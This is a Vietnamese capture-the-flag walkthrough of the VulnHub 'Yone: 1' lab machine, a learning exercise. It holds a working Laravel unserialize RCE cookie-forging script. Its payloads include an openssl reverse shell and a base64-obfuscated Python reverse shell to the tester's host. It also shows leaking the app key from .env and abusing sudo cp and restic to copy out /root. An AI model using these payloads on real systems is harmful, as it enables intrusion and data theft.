Tiếp tục với series những bài vulnhub, lần này tiếp tục là một box medium của team [SunCSR](https://www.vulnhub.com/author/suncsr-team,696/) nhé. 
## I. Tổng quan
### About Release
```
Name: Yone: 1
Date release: 26 Aug 2020
Author: SunCSR Team
Series: Yone
```

### Description
```
Difficulty: Medium
Tested: VMware Workstation 15.x Pro (This works better with VMware rather than VirtualBox)
Goal: Get the root shell i.e.(root@localhost:~#) and then obtain flag under /root).
Information: Your feedback is appreciated - Email: suncsr.challenges@gmail.com
```

### File Information
```
Filename: Yone.ova
File size: 1.7 GB
MD5: 26CA6A38AC3C13DBD8A8BC6AECFCFAE0
SHA1: 8720B61AB6EA0E09CC4CD20415F5FA1BA66EE7CF
```

### Screenshots

![](https://images.viblo.asia/d2447091-68c8-473d-9aa7-ed6cdbb22dc3.png)

![](https://images.viblo.asia/83ff9a04-3bcd-46c8-ab4f-fd5917eede24.png)

## II. Exploit
### Host discovery
```bash
root@kali:~# nmap -sP 172.16.27.129/24
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 21:02 EDT
Nmap scan report for 172.16.27.1
Host is up (0.00032s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 172.16.27.2
Host is up (0.00034s latency).
MAC Address: 00:50:56:E1:5F:7D (VMware)
Nmap scan report for 172.16.27.128  <== yone machine
Host is up (0.00024s latency).
MAC Address: 00:0C:29:90:50:FB (VMware)
Nmap scan report for 172.16.27.254
Host is up (0.00010s latency).
MAC Address: 00:50:56:FA:EB:22 (VMware)
Nmap scan report for 172.16.27.129    <== my machine
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.06 seconds
```

Ở đây, ngoài các địa chỉ của vmware, có 2 địa chỉ active là `172.16.27.128` (máy target) và `172.16.27.129` (máy mình).

### Service enumeration
```bash
root@kali:~# nmap -sV -p- -Pn 172.16.27.128
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 21:06 EDT
Nmap scan report for 172.16.27.128
Host is up (0.00095s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.10.3 (Ubuntu)
MAC Address: 00:0C:29:90:50:FB (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.42 seconds
```

Ở đây, chỉ có 2 dịch vụ đang chạy là `ssh` và `nginx server`. 

Thử truy cập vào web của target, mình thấy các ảnh được load từ domain `yone.lc`. Thử edit file `/etc/hosts` rồi truy cập lại lần nữa

```bash
127.0.0.1       localhost
127.0.1.1       kalic
172.16.27.128   yone.lc
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

![](https://images.viblo.asia/83ff9a04-3bcd-46c8-ab4f-fd5917eede24.png)

ok, ảnh thì load được rồi. Tuy nhiên tìm kiếm trong trang này không có gì đặc sắc cả.

```bash
[21:17:54] Starting: 
[21:18:11] 301 -  194B  - /images  ->  http://172.16.27.128/images/            
[21:18:11] 403 -  580B  - /images/                                         
[21:18:11] 200 -   33KB - /index.html                                  
[21:18:14] 301 -  194B  - /media  ->  http://172.16.27.128/media/             
[21:18:21] 403 -  580B  - /templates/                                             
[21:18:21] 301 -  194B  - /templates  ->  http://172.16.27.128/templates/

Task Completed  
```
Thử truy cập theo domain name thì mình thấy một chút hay ho ở đây

![](https://images.viblo.asia/0f0bdb5e-c6ff-4872-b79c-b43fc06deb16.png)

Thử đăng kí một tài khoản rồi đăng nhập vào xem sao

![](https://images.viblo.asia/24824c08-96b0-4eb6-95ab-26fa9eef4d45.png)

Ở đây có 1 trang upload file. Tuy nhiên, file php thì bị chặn. Thử click vào 1 file trong này thì mình thấy vài thứ có vẻ khai thác được.

![](https://images.viblo.asia/65d6c264-790b-4700-b740-9eddcf320580.png)

thử chút payload với path traversal, quả nhiên là dính :)))

![](https://images.viblo.asia/e9a954cb-7822-4af4-b574-570a81fd2817.png)

Trong file `passwd` có vẻ không khai thác được gì tiếp 

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
yone:x:1000:1000:SunCSR,,,:/home/yone:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false
```

Giờ vứt vào burp và thử tìm xem có file gì hay ho không. Sau khi tìm kiếm 1 hồi thì mình thấy file `composer.json` của trang này:

![](https://images.viblo.asia/60e9884e-f781-4f58-88e1-21c43e3154c2.png)

oops, ở đây phiên bản laravel là 5.5.41. Thử tìm kiếm lỗ hổng với phiên bản này, mình tìm được 1 mã khai thác của metasploit cho phép RCE. 

![](https://images.viblo.asia/e7635ccd-d4fa-4cc9-b6a8-19a1bc9225ec.png)


Tuy nhiên, không hiểu sao mã này không lấy shell được của machine này :)))) Thế là hành trình tìm kiếm lại tiếp tục. Mình lại tiếp tục search các bài phân tích về lỗ hổng này, mình thấy 1 bài khá chi tiết ở [đây](https://blog.truesec.com/2020/02/12/from-s3-bucket-to-laravel-unserialize-rce/).

Ngâm cứu thêm chút về lỗi này thì nó xảy ra do việc deserialize không an toàn của các phiên bản laravel trước 5.6.30. Tác giả đã phân tích rất chi tiết về lỗi này cũng như có cả payload PoC luôn :))))) 

```php
<?php
$cipher = 'AES-256-CBC';
$app_key = 'base64:*********F0=';
$chain_name = 'Laravel/RCE6';
$payload = 'system(\'mkfifo .s && /bin/sh -i < .s 2>&1 | openssl s_client -quiet -connect 127.0.0.1:443 > .s && rm .s\');';

// Use PHPGGC to generate the gadget chain
$chain = shell_exec('./phpggc/phpggc '.$chain_name.' "'.$payload.'"');
// Key can be stored as base64 or string.
if( explode(":", $app_key)[0] === 'base64' ) {
        $app_key = base64_decode(explode(':', $app_key)[1]);
}
// Create cookie
$iv = random_bytes(openssl_cipher_iv_length($cipher));
$value = \openssl_encrypt($chain, $cipher, $app_key, 0, $iv);
$iv = base64_encode($iv);
$mac = hash_hmac('sha256', $iv.$value, $app_key);
$json = json_encode(compact('iv', 'value', 'mac'));

// Print the results
die(urlencode(base64_encode($json)));
```

Thôi thì lười lười dùng luôn payload của tác giả vậy :)))). Tuy nhiên ở đây còn thiếu 1 app_key nữa. Phiên bản laravel này còn có 1 CVE khác là [CVE-2017-16894](https://nvd.nist.gov/vuln/detail/CVE-2017-16894). Theo đó thì cấu hình `env` sẽ có thể tìm được tại `.env` của web. Thử tìm kiếm chút quả nhiên là thấy liền.

![](https://images.viblo.asia/52aa48e2-cd0e-469f-98d8-c08ed7f33edc.png)

Giờ có đủ hết rồi thì thay payload khai thác vào và tấn công thôi

```php 
<?php
$cipher = 'AES-256-CBC';
$app_key = 'base64:vVrSObaPyv3g0b8m6Ky/IjWZDPxiFnW7K4r0VDcWcbk=';
$chain_name = 'Laravel/RCE6';
$payload = 'system(\'echo cHl0aG9uIC1jICJpbXBvcnQgb3M7aW1wb3J0IHB0eTtpbXBvcnQgc29ja2V0O0RSZEhnemFjYW5yQm1tPScxNzIuMTYuMjcuMTI5JztnQkNsYmlIbFBieHZZPTEyMzQ7ZEVlcGx0cnNQU25iPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtkRWVwbHRyc1BTbmIuY29ubmVjdCgoRFJkSGd6YWNhbnJCbW0sZ0JDbGJpSGxQYnh2WSkpO29zLmR1cDIoZEVlcGx0cnNQU25iLmZpbGVubygpLDApO29zLmR1cDIoZEVlcGx0cnNQU25iLmZpbGVubygpLDEpO29zLmR1cDIoZEVlcGx0cnNQU25iLmZpbGVubygpLDIpO29zLnB1dGVudignSElTVEZJTEUnLCcvZGV2L251bGwnKTtwdHkuc3Bhd24oJy9iaW4vYmFzaCcpO2RFZXBsdHJzUFNuYi5jbG9zZSgpOyI=|base64 -d|/bin/bash\');';

// Use PHPGGC to generate the gadget chain
$chain = shell_exec('~/phpggc/phpggc '.$chain_name.' "'.$payload.'"');
// Key can be stored as base64 or string.
if( explode(":", $app_key)[0] === 'base64' ) {
        $app_key = base64_decode(explode(':', $app_key)[1]);
}
// Create cookie
$iv = random_bytes(openssl_cipher_iv_length($cipher));
$value = \openssl_encrypt($chain, $cipher, $app_key, 0, $iv);
$iv = base64_encode($iv);
$mac = hash_hmac('sha256', $iv.$value, $app_key);
$json = json_encode(compact('iv', 'value', 'mac'));

// Print the results
die(urlencode(base64_encode($json)));
```

![](https://images.viblo.asia/de011264-de6e-4bba-809c-077acc472580.png)

Thử với `sudo -l`, mình thấy 1 thứ hay ho khác để khai thác:
```
www-data@ubuntu:/tmp$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (yone) NOPASSWD: /bin/cp
```

Chúng ta có thể sử dụng `/bin/cp` với quyền của user `yone`. Hmmm, mà copy gì bây giờ? Thử tìm trong thư mục home của user này xem sao

```bash
www-data@ubuntu:/tmp$ ls -la /home/yone
ls -la /home/yone
total 32
drwxr-xr-x 4 yone yone 4096 Oct 26 04:30 .
drwxr-xr-x 3 root root 4096 Aug 19 17:59 ..
-rw------- 1 yone yone  574 Oct 27 17:42 .bash_history
-rw-r--r-- 1 yone yone  220 Aug 19 17:59 .bash_logout
drwx------ 3 yone yone 4096 Oct 27 17:45 .cache
-rw------- 1 yone yone  413 Aug 25 18:29 .mysql_history
-rw-r--r-- 1 yone yone  655 Aug 19 17:59 .profile
drwxr--r-- 2 yone yone 4096 Oct 26 03:08 .ssh
-rw-r--r-- 1 root root    0 Aug 21 00:45 .sudo_as_admin_successful
```

Trong thư mục `.ssh`, mình thấy 1 file `authorized_keys`.

```bash
ls -la /home/yone/.ssh
ls: cannot access '/home/yone/.ssh/.': Permission denied
ls: cannot access '/home/yone/.ssh/authorized_keys': Permission denied
ls: cannot access '/home/yone/.ssh/id_rsa': Permission denied
ls: cannot access '/home/yone/.ssh/..': Permission denied
total 0
d????????? ? ? ? ?            ? .
d????????? ? ? ? ?            ? ..
-????????? ? ? ? ?            ? authorized_keys
```

Vậy chắc chúng ta phải ghi đè file này rồi. Tự tạo một file `authorized_keys` ở máy mình rồi add public key của mình vào, sau đó down về máy target. Dùng sudo để ghi đè file authorized_keys của user `yone`

```bash
sudo -u yone /bin/cp authorized_keys /home/yone/.ssh/authorized_keys
```

Giờ có authorized_keys rồi, chỉ cần ssh vào tài khoản này thôi

![](https://images.viblo.asia/7a501cfe-7528-4e4f-a6c9-3f5e0d71846d.png)

Tiếp tục xem quyền sudo của user này, lại là 1 thứ hay ho khác

```bash
yone@ubuntu:~$ sudo -l
Matching Defaults entries for yone on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User yone may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*
```

User này có quyền sử dụng restic với quyền root mà không cần mật khẩu. Restic là một phân mềm mã nguồn mở cho phép backup dữ liệu. Giờ mình cần cài đặt restic và rest-server trên máy mình.

```bash
sudo apt-get install restic
git clone https://github.com/restic/rest-server.git
```

sau đó build rest-server
```bash
cd rest-server
CGO_ENABLED=0 go build -o rest-server ./cmd/rest-server
```

Tiếp theo là khởi tạo 1 repo cho restic

```bash
restic init -r /tmp/restic
```

Giờ chạy server

```bash
./rest-server --no-auth
```

Tiếp theo, để tiện thì mình port forwarding sang máy target:

```bash
ssh -R 8000:127.0.0.1:8000 yone@172.16.27.128
```

Giờ chỉ cần qua máy target backup thư mục mình cần thôi. Vì flag nằm trong /root nên mình sẽ backup lại thư mục này

```
sudo -u root /usr/bin/restic backup -r rest:http://127.0.0.1:8000/ /root
```

Quay lại máy mình, vào thư mục backup (`/tmp/restic`). Trong thư mục snapshot, sẽ thấy 1 file backup của thư mục `/root`

![](https://images.viblo.asia/ee95a500-9858-4106-8d70-c34e2d71780d.png)

Giờ chỉ cần restore và lấy cờ thôi

```bash
restic -r /tmp/restic restore 480b29be019c3b76b3b43f9254250a7444c1b9665ae6624de052e5aadfb29880 --target /tmp/restic-root
```

![](https://images.viblo.asia/e40a306a-3015-499f-9f33-b78fa2880b61.png)